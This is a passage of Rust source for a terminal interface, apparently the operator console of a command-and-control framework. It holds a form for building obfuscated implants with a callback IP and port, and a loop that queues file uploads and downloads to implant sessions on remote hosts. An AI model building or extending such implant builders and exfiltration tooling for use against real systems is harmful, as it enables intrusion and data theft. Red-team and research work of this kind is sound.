    draw_builder_form(frame, app, vsplit[0]);
    draw_builder_log(frame, app, vsplit[1]);
}

fn draw_builder_form(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let b = &app.builder;
    let focused = app.focus == Panel::Builder;

    // Each config row occupies 3 lines (label + selector + gap)
    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(3), // Target
            Constraint::Length(3), // Format
            Constraint::Length(3), // Obfuscation
            Constraint::Length(3), // Callback IP
            Constraint::Length(3), // Callback Port
            Constraint::Length(3), // Output name
            Constraint::Length(3), // Build button
        ])
        .split(area);

    // ── Target ──
    let (tgt_label, _, _) = BUILD_TARGETS[b.target_idx];
    draw_selector_row(frame, rows[0], "Target",
        tgt_label,
        b.target_idx, BUILD_TARGETS.len(),
        focused && b.field == BuilderField::Target,
        false,
    );

    // ── Format ──
    draw_selector_row(frame, rows[1], "Format",
        BUILD_FORMATS[b.format_idx],
        b.format_idx, BUILD_FORMATS.len(),
        focused && b.field == BuilderField::Format,
        false,
    );

    // ── Obfuscation ──
    draw_selector_row(frame, rows[2], "Obfuscation",
        BUILD_OBFUSCATIONS[b.obfusc_idx],
        b.obfusc_idx, BUILD_OBFUSCATIONS.len(),
        focused && b.field == BuilderField::Obfuscation,
        false,
    );

    // ── Callback IP ──
    let cb_ip_active  = focused && b.field == BuilderField::CbIp;
    let cb_ip_editing = cb_ip_active && b.editing;
    let cb_ip_val = if cb_ip_editing { format!("{}█", b.cb_ip) } else { b.cb_ip.clone() };
    draw_text_row(frame, rows[3], "Callback IP", &cb_ip_val, cb_ip_active, cb_ip_editing);

    // ── Callback Port ──
    let cb_port_active  = focused && b.field == BuilderField::CbPort;
    let cb_port_editing = cb_port_active && b.editing;
    let cb_port_val = if cb_port_editing { format!("{}█", b.cb_port) } else { b.cb_port.clone() };
    draw_text_row(frame, rows[4], "Callback Port", &cb_port_val, cb_port_active, cb_port_editing);

    // ── Output name ──
    let out_active  = focused && b.field == BuilderField::OutputName;
    let out_editing = out_active && b.editing;
    let out_val = if out_editing { format!("{}█", b.output_name) } else { b.output_name.clone() };
    draw_text_row(frame, rows[5], "Output Name", &out_val, out_active, out_editing);

    // ── Build button ──
    let btn_focused = focused && b.field == BuilderField::BuildButton;
    let status = b.current_status();
    let (btn_label, btn_color) = match &status {
        BuildStatus::Building => ("  ⟳  BUILDING…  ", Color::Yellow),
        BuildStatus::Success  => ("  ✔  SUCCESS — press b to rebuild  ", Color::Green),
        BuildStatus::Failed   => ("  ✕  FAILED — press b to retry  ", Color::Red),
        BuildStatus::Idle     => ("  ▶  BUILD IMPLANT  [b]  ", Color::Cyan),
    };
    let btn_style = if btn_focused {
        Style::default().fg(Color::Black).bg(btn_color).add_modifier(Modifier::BOLD)
    } else {
        Style::default().fg(btn_color).add_modifier(Modifier::BOLD)
    };
    frame.render_widget(
        Paragraph::new(Line::from(vec![Span::styled(btn_label, btn_style)]))
            .block(Block::default().borders(Borders::ALL)
                .border_style(if btn_focused { Style::default().fg(btn_color).add_modifier(Modifier::BOLD) } else { Style::default().fg(Color::DarkGray) })),
        rows[6],
    );
}

/// Renders a left/right selector (◀ value ▶) for enum options.
fn draw_selector_row(
    frame: &mut ratatui::Frame,
    area: Rect,
    label: &str,
    value: &str,
    idx: usize,
    total: usize,
    focused: bool,
    _editing: bool,
) {
    let left_arrow  = if idx > 0           { Span::styled("◀ ", Style::default().fg(if focused { Color::Green } else { Color::DarkGray })) } else { Span::raw("  ") };
    let right_arrow = if idx + 1 < total   { Span::styled(" ▶", Style::default().fg(if focused { Color::Green } else { Color::DarkGray })) } else { Span::raw("  ") };
    let val_style   = if focused { Style::default().fg(Color::White).add_modifier(Modifier::BOLD) } else { Style::default().fg(Color::DarkGray) };

    frame.render_widget(
        Paragraph::new(Line::from(vec![
            left_arrow,
            Span::styled(value, val_style),
            right_arrow,
        ]))
        .block(Block::default().borders(Borders::ALL)
            .border_style(field_border(focused, false))
            .title(Span::styled(format!(" {} ", label), Style::default().fg(if focused { Color::Cyan } else { Color::DarkGray })))),
        area,
    );
}

/// Renders an editable text field.
fn draw_text_row(
    frame: &mut ratatui::Frame,
    area: Rect,
    label: &str,
    value: &str,
    focused: bool,
    editing: bool,
) {
    let val_style = if editing {
        Style::default().fg(Color::White).add_modifier(Modifier::BOLD)
    } else if focused {
        Style::default().fg(Color::White)
    } else {
        Style::default().fg(Color::DarkGray)
    };

    let hint = if focused && !editing { Span::styled(" [Enter to edit]", Style::default().fg(Color::DarkGray)) } else { Span::raw("") };

    frame.render_widget(
        Paragraph::new(Line::from(vec![
            Span::raw(" "),
            Span::styled(value, val_style),
            hint,
        ]))
        .block(Block::default().borders(Borders::ALL)
            .border_style(field_border(focused, editing))
            .title(Span::styled(format!(" {} ", label), Style::default().fg(if focused { Color::Cyan } else { Color::DarkGray })))),
        area,
    );
}

fn draw_builder_log(frame: &mut ratatui::Frame, app: &mut App, area: Rect) {
    let b = &app.builder;
    let status = b.current_status();
    let log = b.log_lines();

    let title_color = build_status_color(&status);
    let title_label = match &status {
        BuildStatus::Idle     => " Build Output ",
        BuildStatus::Building => " Build Output  [RUNNING] ",
        BuildStatus::Success  => " Build Output  [SUCCESS] ",
        BuildStatus::Failed   => " Build Output  [FAILED] ",
    };

    // Clamp scroll
    let inner_h = area.height.saturating_sub(2) as usize;
    let max_scroll = log.len().saturating_sub(inner_h);
    let scroll = b.log_scroll.min(max_scroll) as u16;

    // Progress bar if building
    let (log_area, maybe_gauge) = if status == BuildStatus::Building {
        let split = Layout::default()
            .direction(Direction::Vertical)
            .constraints([Constraint::Length(1), Constraint::Min(0)])
            .split(area);
        (split[1], Some(split[0]))
    } else {
        (area, None)
    };

    if let Some(gauge_area) = maybe_gauge {
        // Animated progress — just pulse based on log length
        let pct = ((log.len() % 20) * 5) as u16;
        frame.render_widget(
            Gauge::default()
                .gauge_style(Style::default().fg(Color::Yellow).bg(Color::DarkGray))
                .percent(pct)
                .label(Span::styled("compiling…", Style::default().fg(Color::Black).add_modifier(Modifier::BOLD))),
            gauge_area,
        );
    }

    let lines: Vec<Line> = if log.is_empty() {
        vec![Line::from(Span::styled(
            "  Configure options above, then press [b] or navigate to the Build button.",
            Style::default().fg(Color::DarkGray),
        ))]
    } else {
        log.iter().map(|l| {
            let color = if l.starts_with("[+]") { Color::Green }
                else if l.starts_with("[!]") { Color::Red }
                else if l.starts_with("[*]") { Color::Cyan }
                else if l.starts_with("[>]") { Color::Yellow }
                else { Color::White };
            Line::from(Span::styled(l.as_str(), Style::default().fg(color)))
        }).collect()
    };

    frame.render_widget(
        Paragraph::new(lines)
            .scroll((scroll, 0))
            .block(Block::default().borders(Borders::ALL)
                .border_style(Style::default().fg(title_color))
                .title(Span::styled(title_label, Style::default().fg(title_color).add_modifier(Modifier::BOLD)))
                .title_bottom(Span::styled(" u/PgUp scroll up  ·  d/PgDn scroll down  ·  c clear ", Style::default().fg(Color::DarkGray)))),
        log_area,
    );
}


// ================================================================
// MAIN
// ================================================================

fn main() -> Result<(), io::Error> {
    let categories = discover_tree();

    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let mut app = App::new(categories);

    loop {
        app.refresh_sessions();

        // Handle file transfer progress
        let sess_info = app.selected_session().map(|s| (s.id.clone(), s.hostname.clone()));

        if let Some(ref mut fo) = app.file_op {
            // Check for completed downloads
            if fo.mode == FileOpMode::Download {
                if let Some((sess_id, _)) = &sess_info {
                    // fo.local_path = remote file path, fo.remote_path = where to save locally
                    if let Some(file_data) = listener::retrieve_download(&app.dl_store, sess_id, &fo.local_path) {
                        let save_path = if fo.remote_path.ends_with('/') || fo.remote_path.ends_with('\\') {
                            let filename = std::path::Path::new(&fo.local_path)
                                .file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("downloaded_file");
                            format!("{}{}", fo.remote_path, filename)
                        } else {
                            fo.remote_path.clone()
                        };
                        match std::fs::write(&save_path, &file_data) {
                            Ok(_) => {
                                fo.status = format!("Download complete: {} bytes ✓", file_data.len());
                                eprintln!("[FILE_OP] DOWNLOAD COMPLETE: {} bytes saved to {}", file_data.len(), &save_path);
                                fo.progress = 1.0;
                            }
                            Err(e) => {
                                fo.status = format!("Error writing file: {}", e);
                            }
                        }
                    }
                }
            }

            if fo.progress > 0.0 && fo.progress < 1.0 {
                fo.progress += 0.08;
                if fo.progress >= 1.0 {
                    fo.progress = 1.0;

                    // Handle file transfer
                    if let Some((sess_id, sess_hostname)) = sess_info {
                        if fo.mode == FileOpMode::Upload {
                            // Beacon-based upload: read file, base64 encode, queue via listener
                            match std::fs::read(&fo.local_path) {
                                Ok(file_data) => {
                                    let file_size = file_data.len();

                                    // Base64 encode
                                    const B64_TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                                    let mut b64 = String::new();
                                    for chunk in file_data.chunks(3) {
                                        let mut buf = [0u8; 3];
                                        for (i, &b) in chunk.iter().enumerate() {
                                            buf[i] = b;
                                        }
                                        let b = u32::from_be_bytes([0, buf[0], buf[1], buf[2]]) >> (24 - chunk.len() * 8);
                                        let len = chunk.len();
                                        b64.push(B64_TABLE[((b >> 18) & 0x3F) as usize] as char);
                                        b64.push(B64_TABLE[((b >> 12) & 0x3F) as usize] as char);
                                        b64.push(if len > 1 { B64_TABLE[((b >> 6) & 0x3F) as usize] as char } else { '=' });
                                        b64.push(if len > 2 { B64_TABLE[(b & 0x3F) as usize] as char } else { '=' });
                                    }

                                    // Create JSON payload for upload command
                                    let remote_display = if fo.remote_path.contains('\\') {
                                        fo.remote_path.replace('\\', "\\\\")
                                    } else {
                                        fo.remote_path.clone()
                                    };

                                    let cmd = format!(
                                        "{{\"path\":\"{}\",\"data\":\"{}\"}}",
                                        remote_display, b64
                                    );

                                    // Queue the command for the implant
                                    listener::queue_command(&app.cmd_queue, &sess_id, cmd.clone());

                                    fo.status = format!("Upload queued: {} bytes → {} ✓", file_size, fo.remote_path);
                                    eprintln!("[FILE_OP] QUEUED UPLOAD: {} → {} ({} bytes) for {}",
                                        fo.local_path, fo.remote_path, file_size, sess_id);
                                }
                                Err(e) => {
                                    fo.status = format!("Error reading file: {}", e);
                                }
                            }
                        } else {
                            // For download: queue file-recv command to implant
                            let cmd = fo.local_path.clone();  // file-recv just needs the path
                            listener::queue_command(&app.cmd_queue, &sess_id, cmd);
                            fo.status = format!("Download queued: {} ✓", fo.local_path);
                            eprintln!("[FILE_OP] QUEUED DOWNLOAD: {} for {}", fo.local_path, sess_id);
                        }
                    }
                }
            }
        }

        terminal.draw(|frame| draw(frame, &mut app))?;
        if event::poll(Duration::from_millis(250))? {
            if let Event::Key(key) = event::read()? {
                app.on_key(key.code);
            }
        }
        if app.should_quit { break; }
    }

    disable_raw_mode()?;
    execute!(io::stdout(), LeaveAlternateScreen)?;
    Ok(())
}